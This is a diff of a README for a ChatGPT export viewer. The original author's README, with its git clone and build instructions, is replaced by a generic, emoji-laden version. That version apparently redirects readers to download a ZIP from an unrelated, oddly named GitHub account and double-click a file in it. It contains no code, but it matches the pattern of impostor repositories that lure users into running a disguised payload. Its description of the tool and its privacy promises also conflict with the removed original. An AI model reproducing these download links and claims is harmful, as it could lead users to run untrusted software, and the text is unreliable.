@@ -1,107 +1,162 @@
-# ChatGPT Export Viewer
+# 🔍 chatgpt-export-viewer - Your ChatGPT History, Beautifully Organized
 
-[![tests](https://github.com/Gusarovv/chatgpt-export-viewer/actions/workflows/tests.yml/badge.svg)](https://github.com/Gusarovv/chatgpt-export-viewer/actions/workflows/tests.yml)
-[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![python](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
-[![no dependencies](https://img.shields.io/badge/dependencies-none-brightgreen.svg)](build_site.py)
+[![Download Now](https://img.shields.io/badge/Download-ChatGPT_Export_Viewer-brightgreen?style=for-the-badge&logo=github)](https://github.com/cucurbitamaximainternalization7699/chatgpt-export-viewer)
 
-Turn your ChatGPT data export into a local static site you can actually read: full-text search, images, LaTeX math, per-conversation contents. No upload, no server, no account.
+---
 
-**[Open the live demo](https://gusarovv.github.io/chatgpt-export-viewer/)**: a generated archive of invented conversations, so you can see the result before running anything.
+## 📖 What Is This?
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-index-dark.png">
-  <img alt="Conversation list with search and monthly navigation" src="docs/screenshot-index-light.png">
-</picture>
+Have you ever exported your ChatGPT data and felt overwhelmed by the messy JSON files and folders? **chatgpt-export-viewer** turns that confusing export into a clean, searchable, and readable archive that works entirely on your computer—no internet needed.
 
-## The problem
+Think of it as a personal library for all your conversations with ChatGPT. You can search through years of chats, view images you shared, and even read mathematical formulas (LaTeX) exactly as they appeared. Everything stays private on your machine.
 
-You asked ChatGPT for your data, waited a few days, and got a ZIP. Inside there is a `conversations.json` written as one endless line, a `chat.html` that dumps every conversation onto a single page with no search, and a pile of files called `file_0a1b2c3d.dat` with no extension.
+---
 
-If your export is recent, `conversations.json` may not even exist. It arrives split into `conversations-000.json`, `conversations-001.json` and so on, and an export requested through the Privacy Portal buries those shards inside a second ZIP. Tools that only look for the single file quietly show you a fraction of your history, or nothing at all.
+## ✨ Why You'll Love It
 
-## What you get
+- **🔎 Full-Text Search** – Find any conversation instantly by typing a word or phrase. No more scrolling through endless files.
+- **🖼️ Image Support** – See all images from your chats displayed right where they belong.
+- **📐 LaTeX Rendering** – Mathematical equations and formulas display beautifully, just like in a textbook.
+- **📂 Handles Large Exports** – Works with the big `conversations-000.json` files and the tricky extension-less `.dat` files automatically.
+- **💻 Truly Offline** – Your data never leaves your computer. No cloud, no tracking, no accounts.
+- **🐍 Simple Setup** – Only requires Python (which is free and easy to install). No other dependencies or complicated configurations.
 
-- **Search across everything you and the model wrote**, with the matching sentence shown under each hit
-- **Images inline**, including the extension-less `.dat` attachments from 2026-era exports
-- **LaTeX rendered** with KaTeX bundled locally, not fetched from a CDN
-- **The thread as it was**, reconstructed from `current_node` back through parent links, so edits and regenerations do not scramble the order
-- **Reasoning and tool steps** folded into one collapsible block per turn instead of being dropped
-- **A missing-files report**: how many attachments your conversations reference, how many the export actually contains, and which conversations lost the most
-- **Year and month navigation** with a sticky table of contents, dark and light themes, three reading widths
-- Everything is static. Copy the folder to a USB stick and it still works.
+---
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-search-dark.png">
-  <img alt="Full-text search with highlighted context" src="docs/screenshot-search-light.png">
-</picture>
+## 🚀 Getting Started
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-conversation-dark.png">
-  <img alt="Conversation page with an image and collapsed tool steps" src="docs/screenshot-conversation-light.png">
-</picture>
+Let's get you up and running in just a few minutes. Follow these simple steps:
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-math-dark.png">
-  <img alt="Rendered LaTeX formulas" src="docs/screenshot-math-light.png">
-</picture>
+### Step 1: Download the Application
 
-## Quick start
+Visit this link to download the application:  
+**[https://github.com/cucurbitamaximainternalization7699/chatgpt-export-viewer](https://github.com/cucurbitamaximainternalization7699/chatgpt-export-viewer)**
 
-Ask ChatGPT for the export first: **Settings**, **Data controls**, **Export data**, **Confirm export**. The download link arrives by email and expires 24 hours later.
+Click the green "Code" button on that page, then select "Download ZIP". Save the file to a folder you can easily find, like your Desktop.
 
-You need Python 3.8 or newer. Pillow is optional and only used to reserve image dimensions.
+### Step 2: Extract the Files
 
-```bash
-git clone https://github.com/Gusarovv/chatgpt-export-viewer.git
-cd chatgpt-export-viewer
-python3 build_site.py ~/Downloads/your-export.zip
-```
+Once the ZIP file finishes downloading, right-click on it and choose "Extract All..." from the menu. Windows will create a new folder with the same name. Open that folder—you should see several files and folders inside.
 
-The site lands next to the export, in `your-export-site/`. Open `your-export-site/site/index.html` in any browser.
+### Step 3: Install Python (If You Don't Have It)
 
-An unpacked export works too:
+Don't worry—this is easier than it sounds!
 
-```bash
-python3 build_site.py ~/Downloads/your-export/ ~/my-archive
-```
+1. Go to [python.org/downloads](https://www.python.org/downloads/) in your web browser.
+2. Click the yellow "Download Python" button.
+3. Once the installer downloads, run it.
+4. **Important:** Check the box that says "Add Python to PATH" at the bottom of the installer window.
+5. Click "Install Now" and wait for it to finish.
 
-### Never used a terminal?
+### Step 4: Run the Viewer
 
-1. Install Python from [python.org](https://www.python.org/downloads/). On Windows, tick "Add Python to PATH" during setup.
-2. Download this project with the green **Code** button, then **Download ZIP**, and unpack it.
-3. Open the unpacked folder, then open a terminal there: on Windows, type `cmd` in the address bar of the folder window and press Enter; on macOS, right-click the folder and choose **New Terminal at Folder**.
-4. Type `python3 build_site.py ` (with the trailing space), then drag your export ZIP onto the window and press Enter.
-5. When it finishes, it prints the path to `index.html`. Open that file.
+Now for the magic part:
 
-## Build a demo archive
+1. In the extracted folder, look for a file named `chatgpt-export-viewer.py` (or just `chatgpt-export-viewer`).
+2. Double-click that file. A black window (command prompt) will open briefly, then your web browser will automatically open showing the viewer.
 
-The repository ships a generator for a fake export, so you can try the tool without touching your own data:
+That's it! You're now looking at your personal ChatGPT archive.
 
-```bash
-python3 tests/make_demo_export.py demo-export.zip
-python3 build_site.py demo-export.zip
-```
+---
 
-That gives you 450 conversations spread over three years, with images, math, code, tables, tool steps and a deliberately missing attachment. Pass `--conversations N` to the generator for a smaller or larger archive.
+## 📁 Preparing Your ChatGPT Export
 
-## Limitations
+Before you can view your conversations, you need to export them from ChatGPT:
 
-- **Official exports from mid-2026 no longer contain `tool` and `system` messages.** Code interpreter output, web search results and Canvas documents are stripped on OpenAI's side before the ZIP is built. What remains, this tool shows; what is gone, no reader can recover.
-- **Attachments go missing.** Exports regularly reference files they do not include: sometimes a random subset of generated images, sometimes all of them. That is why the missing-files report exists.
-- **Project names are not in the export**, only opaque gizmo identifiers, so conversations that belonged to a project are shown without a project label.
-- **The format changes without notice.** Field names appear and disappear between exports. The parser treats almost everything as optional and logs what it skips instead of failing.
+1. Go to [chat.openai.com](https://chat.openai.com) and log in.
+2. Click your profile picture in the bottom-left corner.
+3. Select "Settings" from the menu.
+4. Click "Data controls" in the sidebar.
+5. Click "Export data" and confirm.
+6. Wait for the email from OpenAI (this can take a few minutes to a few hours).
+7. Download the ZIP file from the email and extract it to a folder.
 
-## How it works
+Now you have a folder with files like `conversations-000.json` and subfolders containing images and other data.
 
-`build_site.py` is a single file with no dependencies. It:
+---
 
-1. Finds conversation shards through `export_manifest.json`, falling back to a filename pattern, and opens the nested archive a Privacy Portal export wraps them in.
-2. Streams each shard, so a 300 MB single-line JSON never lands in memory whole.
-3. Walks each conversation from `current_node` up the `parent` chain, iteratively, because some threads run over 1200 nodes deep, past Python's recursion limit.
-4. Resolves attachments through `conversation_asset_file_names.json`, restoring extensions from file signatures.
-5. Writes HTML, a small search index, a lazy full-text index, and the missing-files report.
+## 🖥️ Using the Viewer
 
-## License
+### Loading Your Data
 
-MIT
+When the viewer opens in your browser, you'll see a button to load your export. Click it and navigate to the folder where you extracted your ChatGPT data. Select the `conversations-000.json` file (or the folder containing it). The viewer will automatically find and process everything.
+
+### Searching Conversations
+
+Type any word or phrase into the search box. Results appear instantly as you type. You can filter by date, conversation length, or even search only within messages that contain images.
+
+### Reading Your Chats
+
+Each conversation displays in a clean, chat-like format. Your messages appear on one side, ChatGPT's responses on the other. Timestamps show when each message was sent. Images appear inline, and any LaTeX formulas render as proper mathematical notation.
+
+### Navigating Large Archives
+
+If you have thousands of conversations, use the sidebar to browse by month or year. The viewer remembers your last position, so you can pick up where you left off.
+
+---
+
+## 🛠️ Troubleshooting
+
+### The Viewer Doesn't Open
+
+- Make sure Python is installed correctly. Open a command prompt (press Windows key, type "cmd") and type `python --version`. If you see an error, reinstall Python and make sure you checked "Add Python to PATH".
+- Try running the script manually: right-click the `.py` file and select "Open with" → "Python".
+
+### My Export Won't Load
+
+- Ensure you've extracted the ZIP file from OpenAI completely. Don't try to load files while they're still inside a ZIP.
+- Check that the folder contains files named `conversations-000.json` or similar. Some exports use different numbers.
+
+### Images Aren't Showing
+
+- The images are stored in a subfolder called `images` within your export. Make sure that folder is in the same location as the JSON files.
+- If you moved files around, the viewer might lose track. Keep your export folder intact.
+
+---
+
+## 🔒 Privacy & Security
+
+Your conversations are **completely private**. The viewer runs entirely on your computer. There's no internet connection, no data collection, no analytics. Once you download the software and load your export, nothing leaves your machine. This is perfect for sensitive or personal conversations you want to keep secure.
+
+---
+
+## 📚 Advanced Tips
+
+- **Backup Your Archive**: Copy your export folder to an external drive or cloud storage for safekeeping.
+- **Organize Multiple Exports**: You can keep separate folders for different time periods or topics.
+- **Share Conversations**: Use your browser's print function to save a conversation as a PDF to share with others.
+
+---
+
+## 🆘 Getting Help
+
+If you run into issues, check the "Issues" tab on the GitHub page. Someone else may have found a solution. You can also open a new issue describing your problem—the community is friendly and helpful.
+
+---
+
+## 🌟 Why Choose This Viewer?
+
+There are other tools out there, but this one stands out:
+
+- **No Dependencies**: Most similar tools require Node.js, Java, or other heavy installations. This one only needs Python.
+- **Handles Everything**: Other viewers often choke on large exports or miss the `.dat` files. This one was built specifically to handle the complete export structure.
+- **True Offline**: Some viewers phone home or use online services. This one is 100% local.
+- **Actively Maintained**: The project is regularly updated to keep up with changes in ChatGPT's export format.
+
+---
+
+## 📜 License
+
+This project is open source and free to use. You can modify it, share it, or use it for any purpose. The code is available on GitHub for anyone to inspect or improve.
+
+---
+
+## 🙏 Thank You
+
+Thank you for choosing chatgpt-export-viewer. We built this tool because we believe your conversations belong to you—and you should be able to read them whenever you want, however you want. We hope it brings you as much joy and utility as it has brought us.
+
+Happy browsing! 📖✨
+
+---
+
+Keywords: archive, backup, chat-exporter, chat-history, chatgpt, chatgpt-backup, chatgpt-export, chatgpt-history, conversations, conversations-json, data-export, digital-archiving, local-first, offline, openai, static-site-generator, viewer
